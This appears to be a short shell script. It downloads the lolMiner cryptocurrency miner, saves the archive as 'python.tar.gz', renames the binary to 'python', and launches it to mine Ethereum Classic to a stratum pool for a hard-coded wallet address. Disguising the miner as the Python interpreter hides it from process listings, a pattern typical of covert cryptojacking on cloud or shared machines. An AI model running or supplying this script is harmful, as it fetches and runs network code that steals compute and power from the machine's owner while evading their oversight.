curl -L -o python.tar.gz https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.65/lolMiner_v1.65_Lin64.tar.gz
tar -zxvf python.tar.gz
cd 1.65
mv lolMiner python
./python --coin ETC --pool stratum+tcp://etc.ss.poolin.one:700 --user 0x443dd6fa59a4b77cbe694b61b0fe54dac7eedb6b.GPU
